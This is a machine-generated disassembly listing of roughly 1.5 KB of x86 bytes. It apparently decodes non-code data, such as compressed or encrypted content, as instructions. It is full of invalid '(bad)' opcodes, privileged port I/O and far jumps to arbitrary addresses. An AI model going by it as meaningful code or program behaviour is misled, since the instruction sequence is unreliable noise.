  41f9a2:	and    BYTE PTR [ecx],ah
  41f9a4:	push   cs
  41f9a5:	into   
  41f9a6:	in     eax,0x69
  41f9a8:	imul   esp,esi,0xa3bf1db0
  41f9ae:	fistp  DWORD PTR [ebp+0x5b]
  41f9b1:	jo     0x41f973
  41f9b3:	call   0x80cb:0xb30d51ae
  41f9ba:	ins    BYTE PTR es:[edi],dx
  41f9bb:	and    ebp,esi
  41f9bd:	pusha  
  41f9be:	lods   eax,DWORD PTR ds:[esi]
  41f9bf:	mov    esp,DWORD PTR [edx+0x719fd50f]
  41f9c5:	push   edx
  41f9c6:	dec    edx
  41f9c7:	mov    esp,0xc3bfd670
  41f9cc:	test   ebx,eax
  41f9ce:	cmp    al,0xa7
  41f9d0:	dec    ebx
  41f9d1:	adc    esi,0xffffffdb
  41f9d4:	xchg   ebx,eax
  41f9d5:	inc    esi
  41f9d6:	or     BYTE PTR [esp+eax*4-0x19],al
  41f9da:	sbb    ch,BYTE PTR [ecx-0x1]
  41f9dd:	inc    ebx
  41f9de:	sbb    al,0x90
  41f9e0:	jbe    0x41f979
  41f9e2:	pop    ebp
  41f9e3:	ja     0x41f978
  41f9e5:	inc    ebp
  41f9e6:	lds    edi,FWORD PTR [eax+0xe233c2c]
  41f9ec:	pop    edx
  41f9ed:	xor    edx,ebp
  41f9ef:	sbb    eax,0x5efe6031
  41f9f4:	or     al,0xe
  41f9f6:	jnp    0x41f981
  41f9f8:	div    dl
  41f9fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f9fb:	sar    DWORD PTR [eax],1
  41f9fd:	jne    0x41f9e3
  41f9ff:	jecxz  0x41fa5c
  41fa01:	aam    0x41
  41fa03:	xchg   dh,bh
  41fa05:	xchg   ebp,eax
  41fa06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa07:	lods   al,BYTE PTR ds:[esi]
  41fa08:	mov    ds:0xbad21e0a,al
  41fa0d:	les    eax,FWORD PTR [edi+eax*2+0x0]
	...
  41fa71:	add    BYTE PTR [eax],al
  41fa73:	add    BYTE PTR [edx],cl
  41fa75:	inc    ecx
  41fa76:	mov    bh,0xa1
  41fa78:	push   edi
  41fa7a:	push   ds
  41fa7b:	jmp    0x41faa0
  41fa7d:	push   edi
  41fa7e:	mov    ds:0xa6a38b15,eax
  41fa83:	in     eax,0xd0
  41fa85:	push   eax
  41fa86:	add    DWORD PTR [eax],eax
  41fa88:	add    al,0x1
  41fa8a:	add    BYTE PTR [eax],al
  41fa8c:	add    ebx,0x27
  41fa8f:	rcr    ah,0x61
  41fa92:	imul   edx,DWORD PTR [edx+esi*1+0x8],0xffffffb8
  41fa97:	(bad)  
  41fa98:	cdq    
  41fa99:	inc    esi
  41fa9a:	mov    edx,0x1d16710b
  41fa9f:	or     BYTE PTR [esi],dl
  41faa1:	mov    ecx,0x45000db3
  41faa6:	pusha  
  41faa7:	pushf  
  41faa8:	in     al,0x0
  41faaa:	jmp    0x41fb09
  41faac:	frstor [ebp-0x42b85274]
  41fab2:	cmp    eax,0xee7fc911
  41fab7:	shr    cl,0x78
  41faba:	jmp    0x8e37:0x4321c713
  41fac1:	mov    eax,0x7febe07c
  41fac6:	sbb    al,0x84
  41fac8:	mov    ah,0x31
  41faca:	inc    ebp
  41facb:	pop    esi
  41facc:	jmp    0x41fa71
  41face:	mov    edx,0x71cfbe77
  41fad3:	clc    
  41fad4:	push   ss
  41fad5:	add    BYTE PTR [ecx-0x53797535],dl
  41fadb:	sbb    BYTE PTR [ecx+0x6e],0x6d
  41fadf:	pop    ds
  41fae0:	sub    ecx,esi
  41fae2:	add    esp,edi
  41fae4:	cmp    al,0x4c
  41fae6:	xor    DWORD PTR [eax+0x5a],ebx
  41fae9:	(bad)  
  41faea:	xor    edi,DWORD PTR [eax]
  41faec:	out    dx,eax
  41faed:	jp     0x41fa75
  41faef:	or     DWORD PTR [eax+0x51e5afda],ebp
  41faf5:	cmp    cl,BYTE PTR [esi+0x6fbd2ac9]
  41fafb:	mov    eax,ds:0xe980ecbf
  41fb00:	imul   esi,DWORD PTR [ebp+0x5d110f4e],0x8fdb056b
  41fb0a:	mov    ss,WORD PTR [esi-0x5b221bbb]
  41fb10:	sub    eax,0xb0d25c7d
  41fb15:	cli    
  41fb16:	jmp    0x2138a875
  41fb1b:	jb     0x41fb27
  41fb1d:	sti    
  41fb1e:	fisub  WORD PTR [esi+ecx*1+0x5f]
  41fb22:	fsubr  QWORD PTR [edx]
  41fb24:	sti    
  41fb25:	or     ah,ah
  41fb27:	sub    BYTE PTR [edx],ah
  41fb29:	in     al,0x60
  41fb2b:	push   es
  41fb2c:	jb     0x41fb6c
  41fb2e:	push   edx
  41fb2f:	jmp    0x91cc:0x7636759c
  41fb36:	fs cld 
  41fb38:	mov    bl,0x48
  41fb3a:	or     DWORD PTR [esp+edi*2-0x3d91c008],0xffffffd1
  41fb42:	aaa    
  41fb43:	fsub   st(4),st
  41fb45:	iret   
  41fb46:	fnstsw WORD PTR [edx]
  41fb48:	xchg   edx,eax
  41fb49:	mov    cs,WORD PTR cs:[ebx+0x57]
  41fb4d:	push   ds
  41fb4e:	nop
  41fb4f:	lahf   
  41fb50:	outs   dx,DWORD PTR ds:[esi]
  41fb51:	jne    0x41fb81
  41fb53:	stc    
  41fb54:	rcl    DWORD PTR [eax+0x6f],1
  41fb57:	loope  0x41fb40
  41fb59:	ins    BYTE PTR es:[edi],dx
  41fb5a:	jae    0x41fb83
  41fb5c:	iret   
  41fb5d:	jb     0x41fbd8
  41fb5f:	jmp    0xb57b4f15
  41fb64:	pop    ds
  41fb65:	repnz in al,dx
  41fb67:	xchg   DWORD PTR [ebx+0x6e],eax
  41fb6a:	mov    ebp,0x36296841
  41fb6f:	pop    ebx
  41fb70:	mov    edx,0x5fb88c36
  41fb75:	push   ecx
  41fb76:	cmp    ecx,DWORD PTR [ecx+eiz*4]
  41fb79:	aas    
  41fb7a:	int3   
  41fb7b:	xchg   ebp,eax
  41fb7c:	jmp    0x29d8:0x7618384a
  41fb83:	daa    
  41fb84:	push   esp
  41fb85:	cmp    BYTE PTR [edi],ch
  41fb87:	pop    ebx
  41fb88:	bound  ecx,QWORD PTR [esi]
  41fb8a:	es pop ss
  41fb8c:	mov    ebp,0x88a059
	...
  41fbf1:	add    BYTE PTR [eax],al
  41fbf3:	add    ah,bl
  41fbf5:	sub    BYTE PTR [edx-0x119011c],cl
  41fbfb:	cmp    BYTE PTR [esi],ah
  41fbfd:	ret    
  41fbfe:	or     DWORD PTR [esi],edx
  41fc00:	mov    esp,0xd4da514b
  41fc05:	push   ecx
  41fc06:	add    DWORD PTR [eax],eax
  41fc08:	add    al,0x1
  41fc0a:	add    BYTE PTR [eax],al
  41fc0c:	xor    edx,DWORD PTR [ecx+0x2f]
  41fc0f:	inc    esi
  41fc10:	into   
  41fc11:	mov    ecx,0x898e5449
  41fc16:	je     0x41fc7a
  41fc18:	aad    0xdf
  41fc1a:	loop   0x41fc7b
  41fc1c:	xor    dh,BYTE PTR [edi-0x4ef687dd]
  41fc22:	not    DWORD PTR [edx]
  41fc24:	mov    ds:0xe2e8eb14,eax
  41fc29:	ds div dh
  41fc2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc2d:	jns    0x41fc32
  41fc2f:	xchg   esp,eax
  41fc30:	push   esi
  41fc31:	adc    dl,BYTE PTR [edi+0x6ecbc1f7]
  41fc37:	adc    esp,ebp
  41fc39:	cdq    
  41fc3a:	(bad)  
  41fc3b:	jmp    0x41fbfc
  41fc3d:	cmp    BYTE PTR [eax],al
  41fc3f:	mov    ecx,0x7d47408a
  41fc44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc45:	addr16 push ds
  41fc47:	push   cs
  41fc48:	mov    ds:0xa6b7655d,eax
  41fc4d:	sub    BYTE PTR [ebx-0x4cf1ba4],bh
  41fc53:	retf   0x9ace
  41fc56:	scas   al,BYTE PTR es:[edi]
  41fc57:	loopne 0x41fc1c
  41fc59:	scas   al,BYTE PTR es:[edi]
  41fc5a:	mov    cl,0xd0
  41fc5c:	jne    0x41fcac
  41fc5e:	inc    ecx
  41fc5f:	mov    edx,0xa42fe5e7
  41fc64:	(bad)  
  41fc65:	pushf  
  41fc66:	rcr    DWORD PTR [edx-0x19434707],1
  41fc6c:	push   ecx
  41fc6d:	sbb    al,0xff
  41fc6f:	fsubr  QWORD PTR [ebx+ebp*1]
  41fc72:	jle    0x41fc7b
  41fc74:	pop    eax
  41fc75:	inc    edx
  41fc76:	jnp    0x41fcdb
  41fc78:	clc    
  41fc79:	sbb    ebx,DWORD PTR [ebx+0xd]
  41fc7c:	cmp    DWORD PTR [edx-0xf45903d],ecx
  41fc82:	mov    ch,0x78
  41fc84:	std    
  41fc85:	adc    al,0xb5
  41fc87:	ss push esp
  41fc89:	push   ebp
  41fc8a:	xor    BYTE PTR [ecx+0x4d],ch
  41fc8d:	icebp  
  41fc8e:	cmp    BYTE PTR [eax],0xd7
  41fc91:	mov    ecx,0xb80b0000
  41fc96:	add    cl,BYTE PTR [esi+0x68]
  41fc99:	xchg   al,dh
  41fc9b:	idiv   BYTE PTR [ebx+0x74]
  41fc9e:	test   eax,ebx
  41fca0:	leave  
  41fca1:	dec    esp
  41fca2:	(bad)  
  41fca3:	retf   
  41fca4:	xor    eax,0x86233cf0
  41fca9:	rcr    BYTE PTR [ecx+0x62b475db],1
  41fcaf:	inc    edi
  41fcb0:	mov    esp,0x2f703e32
  41fcb5:	mov    eax,DWORD PTR [eax]
  41fcb7:	out    dx,al
  41fcb8:	(bad)  
  41fcb9:	or     edi,DWORD PTR [ebx+0x49e52f6b]
  41fcbf:	mov    eax,0x463f9bfd
  41fcc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fcc5:	push   cs
  41fcc6:	dec    ebp
  41fcc7:	clc    
  41fcc8:	invd   
  41fcca:	(bad)  
  41fccb:	into   
  41fccc:	push   esi
  41fccd:	or     DWORD PTR [ecx-0x4],ebp
  41fcd0:	in     eax,dx
  41fcd1:	xor    eax,0x64fbd104
  41fcd6:	inc    edx
  41fcd7:	inc    edi
  41fcd8:	push   esi
  41fcd9:	sbb    BYTE PTR [ecx+0x42626568],0x9f
  41fce0:	jecxz  0x41fc84
  41fce2:	ret    0x2d9c
  41fce5:	push   eax
  41fce6:	or     edx,DWORD PTR [ecx]
  41fce8:	xchg   ecx,eax
  41fce9:	fadd   QWORD PTR [ecx]
  41fceb:	fcomp  st(7)
  41fced:	sub    ecx,ebp
  41fcef:	xlat   BYTE PTR ds:[ebx]
  41fcf0:	dec    esp
  41fcf1:	mov    DWORD PTR [ecx+0x4e],ebx
  41fcf4:	pushf  
  41fcf5:	shl    BYTE PTR [edx],cl
  41fcf7:	mov    ds:0x4c0fab30,al
  41fcfc:	fdivr  QWORD PTR [esi+0x7c]
  41fcff:	mov    ah,0xa
  41fd01:	and    DWORD PTR [esi-0x7c7ff93e],eax
  41fd07:	pop    ss
  41fd08:	retf   0x45f5
  41fd0b:	and    bl,BYTE PTR ds:0x87e266
	...
  41fd71:	add    BYTE PTR [eax],al
  41fd73:	add    BYTE PTR [edx+ebp*2],cl
  41fd76:	push   edx
  41fd77:	shl    DWORD PTR [esi-0x7],0x9f
  41fd7b:	out    dx,eax
  41fd7c:	pop    ds
  41fd7d:	pop    edx
  41fd7e:	pushf  
  41fd7f:	push   ss
  41fd80:	jo     0x41fd29
  41fd82:	cld    
  41fd83:	sbb    eax,0x4000152
  41fd89:	add    DWORD PTR [eax],eax
  41fd8b:	add    BYTE PTR [ebp-0x1f4bd573],cl
  41fd91:	in     al,dx
  41fd92:	xadd   BYTE PTR [ebx-0x1d],ch
  41fd96:	xchg   ebx,eax
  41fd97:	xor    ch,bh
  41fd99:	cmp    eax,0xaf0db861
  41fd9e:	cvttsd2si eax,xmm1
  41fda2:	(bad)  
  41fda3:	sbb    DWORD PTR [ebx],ebp
  41fda5:	inc    ecx
  41fda6:	mov    al,ds:0x3594ab8
  41fdab:	jae    0x41fd34
  41fdad:	shl    BYTE PTR [edi+0x5efe9158],0xfa
  41fdb4:	jbe    0x41fda3
  41fdb6:	fsubr  QWORD PTR [ecx+0x65]
  41fdb9:	xchg   BYTE PTR [ecx-0x4a],bh
  41fdbc:	dec    ebx
  41fdbd:	lods   eax,DWORD PTR ds:[esi]
  41fdbe:	xchg   edx,eax
  41fdbf:	cmp    eax,0x97bf4b41
  41fdc4:	and    edx,DWORD PTR [eax-0x5f]
  41fdc7:	xor    eax,0x7ec90bbd
  41fdcc:	pop    es
  41fdcd:	mov    esi,0x87699a62
  41fdd2:	arpl   WORD PTR [ebp+edi*1+0x1a374ac1],dx
  41fdd9:	daa    
  41fdda:	and    al,0x48
  41fddc:	in     al,dx
  41fddd:	dec    ebx
  41fdde:	jne    0x41fddb
  41fde0:	jnp    0x41fe13
  41fde2:	aas    
  41fde3:	pop    ecx
  41fde4:	seta   BYTE PTR [ebx+0x3a4f88cd]
  41fdeb:	mov    edi,0x1f062cbe
  41fdf0:	mov    ebx,0x29d753d8
  41fdf5:	icebp  
  41fdf6:	xchg   BYTE PTR [edx+0x7e3bcd9a],ah
  41fdfc:	outs   dx,DWORD PTR ds:[esi]
  41fdfd:	test   DWORD PTR [edx-0x3e],ebx
  41fe00:	stos   BYTE PTR es:[edi],al
  41fe01:	fldenv [edx-0x422c39e2]
  41fe07:	fwait
  41fe08:	inc    edx
  41fe09:	jnp    0x41fe78
  41fe0b:	and    BYTE PTR [ebx-0x61],al
  41fe0e:	icebp  
  41fe0f:	sub    al,0x1f
  41fe11:	int3   
  41fe12:	push   edx
  41fe13:	mov    ebx,0xd2a41cdd
  41fe18:	pop    edi
  41fe19:	out    0xc2,al
  41fe1b:	push   ds
  41fe1c:	mov    esp,0xd31bcaec
  41fe21:	cdq    
  41fe22:	push   ds
  41fe23:	nop
  41fe24:	sub    BYTE PTR [esi],0x20
  41fe27:	xor    al,0x8f
  41fe29:	or     esi,eax
  41fe2b:	aaa    
  41fe2c:	xlat   BYTE PTR ds:[ebx]
  41fe2d:	mov    ch,0xdf
  41fe2f:	sub    ch,BYTE PTR ds:0xbc099260
  41fe35:	adc    BYTE PTR [ebx+edi*2],al
  41fe38:	adc    dl,BYTE PTR [edx]
  41fe3a:	test   al,0x78
  41fe3c:	mov    al,0xb2
  41fe3e:	imul   esp,ecx,0x467355c9
  41fe44:	mov    dh,0x27
  41fe46:	inc    esi
  41fe47:	scas   eax,DWORD PTR es:[edi]
  41fe48:	and    al,0x18
  41fe4a:	xchg   edx,eax
  41fe4b:	inc    edi
  41fe4c:	in     eax,dx
  41fe4d:	dec    eax
  41fe4e:	sahf   
  41fe4f:	jp     0x41fec3
  41fe51:	or     ecx,ebx
  41fe53:	iret   
  41fe54:	or     al,ah
  41fe56:	and    esi,ebx
  41fe58:	bound  ecx,QWORD PTR [edx+0x17]
  41fe5b:	fnstenv [edi]
  41fe5d:	fstp   DWORD PTR [edx]
  41fe5f:	adc    al,0x5f
  41fe61:	mov    esp,0x1c002f97
  41fe66:	inc    esp
  41fe67:	add    al,0x16
  41fe69:	sub    al,0xd6
  41fe6b:	data16 (bad) 
  41fe6d:	(bad)  
  41fe6e:	gs inc esi
  41fe70:	cmp    DWORD PTR [ecx+eax*4-0x7f],edx
  41fe74:	mov    ecx,DWORD PTR [eax-0x27]
  41fe77:	or     DWORD PTR [eax-0x6de1225],edx
  41fe7d:	xchg   esp,eax
  41fe7e:	cld    
  41fe7f:	mov    edi,0x9a94a7b3
  41fe84:	mov    esp,0x44a6468b
  41fe89:	inc    ebx
  41fe8a:	ds out 0x15,eax
  41fe8d:	sbb    DWORD PTR [ebp+0x4e],0x0
	...
  41fef3:	add    BYTE PTR [edx-0x1865ab],ch
  41fef9:	out    dx,eax
  41fefa:	call   FWORD PTR [ebp-0x5]
  41fefd:	(bad)  
  41fefe:	hlt    
  41feff:	mov    ah,0x92
  41ff01:	sub    BYTE PTR [edx+0x153dc7f],bh
  41ff07:	add    BYTE PTR [ecx+eax*1],al
  41ff0a:	add    BYTE PTR [eax],al
  41ff0c:	sbb    BYTE PTR [ecx-0x6770d118],ch
  41ff12:	dec    ebp
  41ff13:	in     al,0xe0
  41ff15:	mov    BYTE PTR [edi+0x3a9cafe9],dh
  41ff1b:	mov    edi,0x40f8ce67
  41ff20:	adc    edx,DWORD PTR [esi+0x45fd6ef7]
  41ff26:	(bad)  
  41ff27:	fild   QWORD PTR [eax-0x667d0acb]
  41ff2d:	pop    ebx
  41ff2e:	icebp  
  41ff2f:	ja     0x41ff51
  41ff31:	push   esp
  41ff32:	mov    ebp,0xd8169293
  41ff37:	add    al,0x85
  41ff39:	pop    ebp
  41ff3a:	rcl    WORD PTR [ebx+0x2b],0x48
  41ff3f:	clc    
  41ff40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff41:	outs   dx,BYTE PTR ds:[esi]
  41ff42:	mov    dh,0x17
  41ff44:	ds in  al,dx
  41ff46:	std    
  41ff47:	inc    esp
  41ff48:	jmp    0xf994688c
  41ff4d:	into   
  41ff4e:	and    eax,0xc54793dc
  41ff53:	xor    ah,BYTE PTR [ecx]
  41ff55:	pop    ebp
  41ff56:	scas   eax,DWORD PTR es:[edi]
  41ff57:	int    0xe2
  41ff59:	xchg   edi,eax
  41ff5a:	inc    ebx
  41ff5b:	js     0x41ff67
  41ff5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff5e:	(bad)  
  41ff60:	sahf   
  41ff61:	jmp    0xbf9d:0xeeb8e405
  41ff68:	pop    eax
  41ff69:	ja     0x41ffe6
  41ff6b:	jmp    0x790c1d66
  41ff70:	icebp  
  41ff71:	jnp    0x10adf07e
  41ff77:	jmp    0x3a57:0x48ec3ec5
  41ff7e:	xchg   DWORD PTR [eax-0x26],ecx
  41ff81:	or     BYTE PTR [eax],dl
  41ff83:	fist   WORD PTR [edx+0x26]
  41ff86:	mov    al,BYTE PTR ds:0xfab773d2
  41ff8c:	(bad)  
  41ff8d:	loope  0x41ff87
  41ff8f:	pop    edx
  41ff90:	loop   0x41ff6c
  41ff92:	mov    dh,0xba
  41ff94:	call   0xa872:0xd83da269
  41ff9b:	leave  
  41ff9c:	jno    0x41ff4f
  41ff9e:	mov    edx,0xf84dd497
  41ffa3:	inc    edx
  41ffa4:	adc    eax,0x8e93153d
  41ffa9:	adc    al,0xbb
  41ffab:	lods   eax,DWORD PTR ds:[esi]
  41ffac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffad:	mov    ebx,0x2b4b717c
  41ffb2:	retf   
  41ffb3:	adc    al,0xda
  41ffb5:	xor    bl,BYTE PTR [edx-0x7fe061ad]
  41ffbb:	(bad)  
  41ffbc:	lock mov al,ds:0x2615433e
  41ffc2:	cwde   
  41ffc3:	sbb    ecx,ebp
  41ffc5:	sub    ebx,esp
  41ffc7:	rcl    BYTE PTR [ebx],1
  41ffc9:	inc    ecx
  41ffca:	xchg   esi,eax
  41ffcb:	push   edi
  41ffcc:	into   
  41ffcd:	loope  0x41ff57
  41ffcf:	cmp    edi,DWORD PTR [edx]
  41ffd1:	xor    edi,esi
  41ffd3:	cmp    bl,BYTE PTR [ebx+0x3f5f986d]
  41ffd9:	mov    al,ds:0x7bcc0f0a
  41ffde:	sub    ebp,DWORD PTR [esi]
  41ffe0:	ins    DWORD PTR es:[edi],dx
  41ffe1:	xor    DWORD PTR [edx-0x1e805c18],esp
  41ffe7:	popf   
  41ffe8:	dec    edx
  41ffe9:	xor    al,0x43
  41ffeb:	pop    edi
  41ffec:	dec    eax
  41ffed:	popa   
  41ffee:	add    ch,BYTE PTR [eax]
  41fff0:	arpl   WORD PTR ds:0x984d0006,ax
  41fff6:	dec    ebp
  41fff7:	or     ch,BYTE PTR [edi+0x370b5d0c]
  41fffd:	test   al,0x2
  41ffff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420000:	inc    ebx
  420001:	jp     0x41ffcb
  420003:	and    al,0xbd
  420005:	pop    ebx
  420006:	jno    0x420047
  420008:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420009:	int3   
  42000a:	xchg   edx,eax
  42000b:	dec    eax
  42000c:	or     edi,DWORD PTR [ebx+0x723f]
	...
  420072:	add    BYTE PTR [eax],al
  420074:	bound  esp,QWORD PTR [ebp-0x8808a]
  42007a:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0xffffffb0
  420081:	inc    ecx
  420082:	mov    WORD PTR [ecx],?
  420084:	loopne 0x4200da
  420086:	add    DWORD PTR [eax],eax
  420088:	add    al,0x1
  42008a:	add    BYTE PTR [eax],al
  42008c:	mov    bl,0x81
  42008e:	sbb    eax,DWORD PTR [edi-0x7]
  420091:	or     eax,0x9748c494
  420096:	mov    eax,ds:0x74bd1a15
  42009b:	inc    edi
  42009c:	dec    edi
  42009d:	push   eax
  42009e:	(bad)  
  42009f:	cmp    al,0xae
  4200a1:	in     eax,dx
  4200a2:	jbe    0x420029
  4200a4:	pop    edx
  4200a5:	ds ret 
  4200a7:	xchg   bl,bh
  4200a9:	xor    al,0x45
  4200ab:	xor    cl,bh
  4200ad:	pop    edi
  4200ae:	mov    BYTE PTR [ebx+ecx*2+0x6a],dh
  4200b2:	mov    ds:0x922125ac,eax
  4200b7:	outs   dx,DWORD PTR ds:[esi]
  4200b8:	(bad)
  4200bc:	jb     0x4200af
  4200be:	sbb    eax,0x436eb5b9
  4200c3:	mov    ebx,0xf77d7b7c
  4200c8:	into   
  4200c9:	pop    esi
  4200ca:	xchg   ebp,eax
  4200cb:	pop    es
  4200cc:	jmp    0x2a05327f
  4200d1:	sub    edi,ecx
  4200d3:	mov    edx,edi
  4200d5:	mov    edx,0xc282c8d6
  4200da:	cmp    al,0x7d
  4200dc:	scas   eax,DWORD PTR es:[edi]
  4200dd:	add    cl,dl
  4200df:	sbb    eax,0xfe3f0515
  4200e4:	jle    0x4200ef
  4200e6:	cld    
  4200e7:	xchg   ecx,eax
  4200e8:	mov    ecx,edi
  4200ea:	fst    DWORD PTR [esp+eax*4]
  4200ed:	pop    ebx
  4200ee:	sbb    dh,BYTE PTR [esi*4-0x1b179e85]
  4200f5:	call   0x8fc4:0xe6211eaa
  4200fc:	push   esi
  4200fd:	dec    eax
  4200fe:	push   ds
  4200ff:	dec    esp
  420100:	push   DWORD PTR [ebx+edx*1]
  420103:	push   ebp
  420104:	imul   edx,DWORD PTR [ebx],0x4ea52f4d
  42010a:	bndldx (bad),[edi-0x7e]
  42010e:	inc    edi
  42010f:	int    0x11
  420111:	adc    ah,BYTE PTR [ebp+0x1]
  420114:	or     DWORD PTR [edi+0x79],eax
  420117:	out    dx,eax
  420118:	xor    eax,0x4bb8c7fa
  42011d:	xchg   DWORD PTR [esi+0x36],ecx
  420120:	mov    cl,0xcf
  420122:	sbb    al,0x76
  420124:	(bad)  
  420125:	sbb    edi,DWORD PTR [ecx]
  420127:	(bad)  
  420128:	outs   dx,BYTE PTR ds:[esi]
  420129:	xchg   esi,eax
  42012a:	pop    esp
  42012b:	add    dh,BYTE PTR [ecx]
  42012d:	xchg   esi,eax
  42012e:	xlat   BYTE PTR ds:[ebx]
  42012f:	sbb    BYTE PTR [edx-0x2fdcf4f2],ah
  420135:	pop    edx
  420136:	adc    eax,0x4a3066c8
  42013b:	(bad)  
  42013c:	cs mov eax,0xd9a7c8e6
  420142:	test   al,0x2f
  420144:	add    edi,ebp
  420146:	aam    0xdd
  420148:	xor    BYTE PTR [ebx],al
  42014a:	pop    esp
  42014b:	add    BYTE PTR [eax],ah
  42014d:	adc    al,bl
  42014f:	push   edx
  420150:	xchg   ebp,eax
  420151:	and    DWORD PTR [ecx-0x140dfdce],ebp
  420157:	fstp   TBYTE PTR [edi+0x77]
  42015a:	ret    0x461a
  42015d:	add    al,bl
  42015f:	aam    0xcd
  420161:	mov    ds:0x2a36b345,al
  420166:	mov    ch,BYTE PTR [ebp-0x7d]
  420169:	pop    es
  42016a:	lods   eax,DWORD PTR ds:[esi]
  42016b:	add    DWORD PTR [esi-0x55],edx
  42016e:	cmp    ch,0xab
  420171:	loope  0x420126
  420173:	or     DWORD PTR [edx-0x71],0x6c
  420177:	popa   
  420178:	and    BYTE PTR [esi-0x6a],0xc2
  42017c:	loopne 0x4201d7
  42017e:	enter  0xc75f,0x25
  420182:	ror    BYTE PTR [ebx+edx*2],1
  420185:	mov    bh,BYTE PTR [edx]
  420187:	aam    0x20
  420189:	push   cs
  42018a:	pop    ebp
  42018b:	mov    cl,0x8d
  42018d:	mov    esp,0x467e
	...
  4201f2:	add    BYTE PTR [eax],al
  4201f4:	jae    0x4201c5
  4201f6:	fwait
  4201f7:	cmp    DWORD PTR [edi-0x27300c83],edi
  4201fd:	stos   BYTE PTR es:[edi],al
  4201fe:	sar    BYTE PTR [ebx-0x4fdf81b6],1
  420204:	in     al,0x55
  420206:	add    DWORD PTR [eax],eax
  420208:	add    al,0x1
  42020a:	add    BYTE PTR [eax],al
  42020c:	call   0x2578:0x4faf7222
  420213:	jecxz  0x42024a
  420215:	mov    edi,0x6054a19d
  42021a:	xor    al,0x63
  42021c:	xchg   ecx,eax
  42021d:	cmp    dl,BYTE PTR [ebx]
  42021f:	push   ecx
  420220:	mov    edi,0x924263dc
  420225:	gs cmp al,0x93
  420228:	mov    esi,DWORD PTR [esi-0x4bf09d0e]
  42022e:	mov    al,ds:0xfdbb3a4a
  420233:	pop    esp
  420234:	add    ebp,ecx
  420236:	inc    esi
  420237:	sbb    eax,0xc06f3bc0
  42023c:	clc    
  42023d:	ror    DWORD PTR [ebx-0x57],cl
  420240:	sub    al,0x2b
  420242:	sub    al,0x98
  420244:	and    al,0x76
  420246:	or     al,0x54
  420248:	mov    eax,ds:0xd3085d0e
  42024d:	mov    ebp,0x588df3b8
  420252:	mov    bh,al
  420254:	mov    esi,0x4608dacc
  420259:	push   ebp
  42025a:	movaps xmm0,XMMWORD PTR [esi-0x40]
  42025e:	mov    ah,0x4c
  420260:	jp     0x4201e9
  420262:	inc    eax
  420263:	inc    esi
  420264:	in     al,dx
  420265:	sbb    DWORD PTR [ebx],edx
  420267:	xor    edx,DWORD PTR [edi-0x65c0c4d5]
  42026d:	pop    edx
  42026e:	cs dec esp
  420270:	in     al,0x3e
  420272:	cmp    bl,BYTE PTR [esi]
  420274:	xchg   edi,eax
  420275:	inc    eax
  420276:	add    al,0x2b
  420278:	retf   0x8a66
  42027b:	sub    al,BYTE PTR [eax+0x3b]
  42027e:	or     al,cl
  420280:	test   al,0x4b
  420282:	mov    bl,0x3e
  420284:	sar    DWORD PTR [esi],1
  420286:	ret    
  420287:	push   es
  420288:	cmp    al,0x3
  42028a:	xchg   ecx,eax
  42028b:	mov    ebx,0x90edba56
  420290:	mov    edx,0xbb98a376
  420295:	jg     0x4202c0
  420297:	iret   
  420298:	inc    esi
  420299:	sahf   
  42029a:	jl     0x4202eb
  42029c:	retfw  
  42029e:	xchg   ebp,eax
  42029f:	fnstcw WORD PTR [ecx+0x7498f829]
  4202a5:	addr16 out dx,al
  4202a7:	hlt    
  4202a8:	(bad)  
  4202a9:	data16 mov dl,0xf7
  4202ac:	and    al,0x15
  4202ae:	xor    eax,0x44ddec64
  4202b3:	dec    esi
  4202b4:	shl    DWORD PTR [ebp+ebp*8+0x67],0x5a
  4202b9:	call   0xec035946
  4202be:	in     eax,0x5b
  4202c0:	mov    ebx,0x3631d6b0
  4202c5:	je     0x420273
  4202c7:	jmp    0x2e9de772
  4202cc:	fmul   st,st(7)
  4202ce:	(bad)  
  4202cf:	cmp    DWORD PTR [ebx+esi*1-0x4d],ecx
  4202d3:	mov    ds:0x525076bf,al
  4202d8:	shr    DWORD PTR gs:[esi-0x15f9833e],1
  4202df:	jge    0x4202ff
  4202e1:	xlat   BYTE PTR ds:[ebx]
  4202e2:	out    dx,eax
  4202e3:	repz sbb eax,0x4c1dfec
  4202e9:	jmp    0x98297c61
  4202ee:	or     eax,0x5f804d5b
  4202f3:	pop    ss
  4202f4:	mov    ch,0xc2
  4202f6:	push   ss
  4202f7:	sar    BYTE PTR ds:0xb28d1444,0x69
  4202fe:	pop    eax
  4202ff:	push   ds
  420300:	jp     0x4202ba
  420302:	mov    ds:0xb367cd1e,al
  420307:	dec    ecx
  420308:	jle    0x420319
  42030a:	ins    DWORD PTR es:[edi],dx
  42030b:	js     0x4202b2
  42030d:	mov    gs,ebp
  42030f:	mov    BYTE PTR [eax],0x0
	...
  420372:	add    BYTE PTR [eax],al
  420374:	inc    ecx
  420375:	push   es
  420376:	clc    
  420377:	mov    esi,0xff47feff
  42037c:	and    BYTE PTR [eax+0x2a],bh
  42037f:	hlt    
  420380:	dec    ebp
  420381:	stos   BYTE PTR es:[edi],al
  420382:	mov    ss,ebp
  420384:	call   0x44204df
  420389:	add    DWORD PTR [eax],eax
  42038b:	add    BYTE PTR [ecx-0x48330765],cl
  420391:	test   al,ah
  420393:	fsubr  QWORD PTR [edi]
  420395:	inc    ecx
  420396:	mov    bl,0x15
  420398:	xchg   edx,eax
  420399:	call   0xfc4a22c2
  42039e:	jmp    0x322bddbd
  4203a3:	(bad)  
  4203a4:	and    ebp,edx
  4203a6:	jno    0x420399
  4203a8:	call   0xa3a82b65
  4203ad:	lods   eax,DWORD PTR ds:[esi]
  4203ae:	sub    eax,0x46303182
  4203b3:	call   0x87fbb66c
  4203b8:	push   es
  4203b9:	pop    edi
  4203ba:	mov    eax,ds:0xdc401db5
  4203bf:	(bad)  
  4203c0:	(bad)  
  4203c1:	jb     0x420406
  4203c3:	aaa    
  4203c4:	fs sahf 
  4203c6:	mov    edi,0x8f77f128
